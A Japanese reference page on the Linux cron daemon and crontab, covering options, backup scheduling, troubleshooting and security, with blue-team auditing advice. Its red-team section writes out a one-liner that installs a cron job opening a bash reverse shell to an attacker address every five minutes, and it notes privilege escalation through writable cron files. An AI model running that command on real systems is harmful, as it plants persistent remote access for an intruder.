# Command  - Linux - cron - コマンドを定期的に自動実行する

## 概要

`cron` は、Unix系OSにおいて、指定したスケジュール（例: 毎日午前3時、毎週日曜日、10分ごと）にしたがってコマンドやスクリプトを**定期的・周期的**に自動実行するためのデーモン（バックグラウンドプロセス）です。その設定ファイルや、設定を編集するためのコマンドを `crontab` と呼びます。システムのバックアップ、ログのローテーション、監視スクリプトの実行など、サーバ管理における定型的なタスクの自動化に広く利用されます。

(出自: `cron` または `cronie` パッケージに含まれる)

## 類似コマンドと差異

| 類似コマンド | 差異 / 使い分けのポイント | 推奨 |
| :--- | :--- |:---|
| **`at`** | `at` は、指定した時刻に**一度だけ**タスクを実行します。`cron` は**繰り返し**タスクを実行します。 | - |
| **`systemd Timers`** | `cron` のよりモダンな代替機能。`systemd` と統合されており、より柔軟で高機能（ログ連携、リソース制御など）です。 | `systemd Timers` |
| **`anacron`** | 24時間稼働していないシステム向けの `cron` の補助機能。システム起動時に「実行されるはずだったジョブ」を実行します。 | - |

## よく連携されるコマンド

`cron` はスクリプトを実行させることが多いため、スクリプトの作成や権限設定を行うコマンドと連携します。

### シナリオ例: バックアップスクリプトをcronに登録する (インフラ構築・運用視点)

* **目的**: データベースをバックアップするシェルスクリプトを作成し、毎日深夜に自動実行されるようにcronに登録する。
* **連携コマンド**: `vi` (または `nano`), `chmod`, `crontab`
* **解説**: まず実行したい処理をスクリプトとして作成し、実行権限を付与します。その後、`crontab -e` でエディタを開き、スケジュールと実行するスクリプトのフルパスを記述します。
* **コマンド例**:

```bash
# 1. バックアップスクリプトを作成・編集
vi /usr/local/bin/db_backup.sh

# 2. スクリプトに実行権限を付与
sudo chmod +x /usr/local/bin/db_backup.sh

# 3. crontabを編集モードで開く
crontab -e
# 以下の行を追記:
# 毎日午前2時30分にバックアップスクリプトを実行
# 30 2 * * * /usr/local/bin/db_backup.sh > /var/log/db_backup.log 2>&1
```

## オプション説明 (`crontab` コマンド)

| オプション | 説明 |
| :--- | :--- |
| **編集と表示** | |
| ⭐ `-e` | 現在のユーザーの `crontab` ファイルを編集モードで開きます。 |
| ⭐ `-l` | 現在のユーザーの `crontab` ファイルの内容を表示します。 |
| ⭐ `-r` | 現在のユーザーの `crontab` ファイルを削除します。**注意して使用してください**。 |
| **ユーザー指定** | |
| `-u <user>`| (`root`権限要) 他のユーザーの `crontab` を操作します。（例: `sudo crontab -u www-data -l`）|

## よく使われるオプション組み合わせと業務シナリオ

### 1. インフラ構築・運用視点

* **タスク**: 定期的なバックアップスクリプトや、ディスク使用量チェックを登録する。
* **組み合わせ**: `crontab -e`
* **解説**: `crontab -e` でエディタを開き、スケジュールと実行コマンドを記述します。コマンドの出力は `/dev/null` にリダイレクトして不要な通知メールを防ぐか、ログファイルに追記するのが一般的です。
* **例**:

```crontab
# 毎日午前2時15分にバックアップスクリプトを実行し、ログを取る
15 2 * * * /usr/local/bin/backup.sh >> /var/log/backup.log 2>&1
```

### 2. ブルーチーム視点

* **タスク**: システムに不審な永続化設定がないか監査する。
* **組み合わせ**: `crontab -l -u <user>`, `cat /etc/cron.d/*`
* **解説**: `crontab -l -u` で各ユーザーのcronジョブをリスト表示します。システム全体のcronジョブ (`/etc/crontab`, `/etc/cron.d/`) も併せて監視し、攻撃者が永続化のために仕掛けた不審なジョブがないかを調査します。
* **例**:

```bash
# 全ユーザーのcron設定を確認するスクリプト例
for user in $(cut -f1 -d: /etc/passwd); do
	echo "### Crontab for $user ###";
	sudo crontab -l -u $user 2>/dev/null;
done
```

### 3. レッドチーム視点

* **タスク**: システム侵入後、永続化のためにリバースシェルを定期実行させる。
* **組み合わせ**: `(crontab -l; echo "...") | crontab -`
* **解説**: 現在のcron設定を読み込み、そこにリバースシェルを起動する行を追加して、パイプ経由で `crontab` に再設定します。これにより、一度セッションが切れても、再度システムに侵入できる状態を維持します。
* **例**:

```bash
# 5分ごとに攻撃者のサーバ(10.0.0.5:4444)へリバースシェルを接続するcronジョブを仕掛ける
(crontab -l 2>/dev/null; echo "*/5 * * * * bash -i >& /dev/tcp/10.0.0.5/4444 0>&1") | crontab -
```

## エラーメッセージとトラブルシューティング

* 一般的なエラーは [Linux共通のトラブルシューティング](./troubleshooting_common_errors.md) を参照。

1. **現象**: **cronジョブが実行されない。**
		* **考えられる原因**:
				* **PATH環境変数の問題**: cronが実行される際の`PATH`は非常に限定的です。コマンドをフルパスで指定していないと失敗します。
				* **パーミッション不足**: スクリプトに実行権限 (`+x`) が付与されていない。
		* **解決策**:
				* コマンドは `/usr/local/bin/myscript.sh` のように**必ずフルパスで指定**します。
				* `chmod +x /path/to/script.sh` で実行権限を付与します。

2. **現象**: **手動で実行するとうまくいくスクリプトが、cronだと動かない。**
		* **考えられる原因**: ログインシェル (`.bashrc` など) で設定される環境変数がcron実行時には読み込まれないためです。
		* **解決策**: スクリプト内で必要な環境変数を明示的に `export` するか、スクリプト冒頭で `cd /path/to/workdir` のように、期待するワーキングディレクトリに移動します。

## 環境変数と設定ファイル

* 一般的な環境変数・設定ファイルは [Linux共通の環境変数・設定ファイル](./environment_and_config.md) を参照。

### 関連する設定ファイル

* **`/var/spool/cron/`**: 各ユーザーのcrontabファイルが保存されているディレクトリ。
* **`/etc/crontab`**: システム全体のcrontab。ユーザーを指定するフィールドが追加されています。
* **`/etc/cron.d/`**: システムワイドなcronジョブを、パッケージごとなどに分割して配置するディレクトリ。
* **`/etc/cron.allow`, `/etc/cron.deny`**: cronの利用を許可/拒否するユーザーを制御します。

## セキュリティに関する考慮事項

### 脆弱性と悪用事例

* **脆弱性**: cron自体の脆弱性よりも、**設定の不備**が悪用されます。
* **悪用シナリオ**: cronは、攻撃者にとって最もポピュラーな**永続化 (Persistence)** の手法の1つです。侵入後、リバースシェルやマルウェアのダウンローダーなどをcronジョブとして登録し、システム管理者に見つかるまで定期的に実行させ続けます。

### GTFOBins / LOLBAS における利用例

* **機能**: **Privilege Escalation** (権限昇格)
* **解説**: `/etc/crontab` や `/etc/cron.d/` 内のファイルが一般ユーザーでも書き込み可能になっている場合、そのファイルを編集してroot権限で実行されるコマンドを仕込むことができます。
* **参照**: `https://gtfobins.github.io/gtfobins/crontab/`

### 対応策・緩和策 (ブルーチーム視点)

* **Prevention (予防)**: cron関連のファイルとディレクトリのパーミッションを定期的に監査し、不適切な書き込み権限が付与されていないか確認する。
* **Detection (検知)**: `/etc/cron.d/` や `/var/spool/cron/` 配下のファイルの変更をFIMツールで監視し、意図しないジョブの登録を検知する。

## 注意点・補足

* **出力のリダイレクト**: cronジョブが出力を行うと、デフォルトでユーザーにメールが送信されます。これを避けるため、`> /dev/null 2>&1` で出力を抑制するか、ログファイルに記録することが推奨されます。
* **`%` のエスケープ**: crontab内で `%` 記号を使いたい場合（例: `date` コマンド）、バックスラッシュ `\` でエスケープする必要があります (`\%`)。
